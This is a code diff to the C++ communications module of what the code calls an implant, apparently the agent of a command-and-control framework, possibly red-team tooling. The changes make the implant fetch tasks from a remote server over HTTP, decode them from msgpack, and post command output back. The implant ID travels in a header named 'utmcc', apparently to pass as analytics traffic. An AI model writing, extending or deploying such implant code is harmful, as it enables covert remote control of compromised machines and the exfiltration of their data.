@@ -6,7 +6,7 @@
 
 //Comms file, this is where the comms/transform calls, etc go
 // 
-int get(std::string implant_uuid) {
+nlohmann::json get(std::string implant_uuid) {
     //note, pass a copy of implant_uuid in, as we are going to be potentialyl heavily editing it. 
 
     std::vector<uint8_t> http_response_buffer;
@@ -37,21 +37,45 @@ int get(std::string implant_uuid) {
     };
 
     if (HTTP_GET(headers, http_response_buffer)) {
+        // Check if buffer is empty before decoding
+        if (http_response_buffer.empty()) {
+            return nullptr;
+        }
         std::cout << "Success! Bytes read: " << http_response_buffer.size() << std::endl;
+        nlohmann::json task_data = decode_msgpack_task(http_response_buffer);
+        return task_data;
+
     }
+    //could also check for 204, maybe do that at the HTTP_GET func level. For now, if no task/no body, it says no task and sleeps
     else {
+        
         std::cerr << "Request failed." << std::endl;
+        return nullptr;
     }
 
     /*
     TEMPLATE_END
     */
+    return nullptr;
+}
 
+int post(std::string implant_uuid, std::string output_data) {
+    std::vector<uint8_t> http_post_response_buffer;
+
+    //any transformations to data
+    //base64_encode_inplace(implant_uuid); //this should be metadata buffer
+
+    //add into header - wstring cuz that's what the winapi uses
+    std::vector<std::wstring> headers = {
+    L"utmcc: " + std::wstring(implant_uuid.begin(), implant_uuid.end())
+    };
+
+    //send
+    HTTP_POST(output_data, headers, http_post_response_buffer);
     return 0;
+
 }
 
 
-
-int post() {
-    return 1;
-}
+//overload for bytes
+//int post(std::vector<uint8_t> output_data)
